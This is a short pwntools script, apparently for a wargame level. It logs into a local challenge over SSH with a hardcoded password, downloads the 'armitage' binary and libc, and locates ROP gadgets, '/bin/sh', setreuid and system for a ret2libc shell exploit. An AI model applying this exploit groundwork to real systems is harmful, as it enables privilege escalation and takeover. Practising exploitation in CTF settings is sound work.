from pwn import *

OFFSET=0x00007ffff7c00000

context.clear(arch='amd64', os='linux')

shell = ssh(host='localhost', user='level03', port=4242, password='qeplvibynup98phqb312dkvhtpdkklac')

shell.download_file('armitage', '/tmp/armitage')
shell.download_file('/lib/x86_64-linux-gnu/libc.so.6', '/tmp/libc.so.6')

elf = ELF('/tmp/armitage')
print(f" gadget in armitage executable: {hex(next(elf.search(asm('pop rdi ; ret')), 0))}")

elf = ELF('/tmp/libc.so.6')
print(f" pop rdi gadget in libc: {hex(next(elf.search(asm('pop rdi ; ret')), 0) + OFFSET)}")
print(f" pop rsi gadget in libc: {hex(next(elf.search(asm('pop rsi ; ret')), 0) + OFFSET)}")

print(f" /bin/sh string in libc: {hex(next(elf.search(b'/bin/sh'), 0) + OFFSET)}")

print(f"setreuid: {hex(elf.symbols["setreuid"] + OFFSET)}")
print(f"system: {hex(elf.symbols["system"] + OFFSET)}")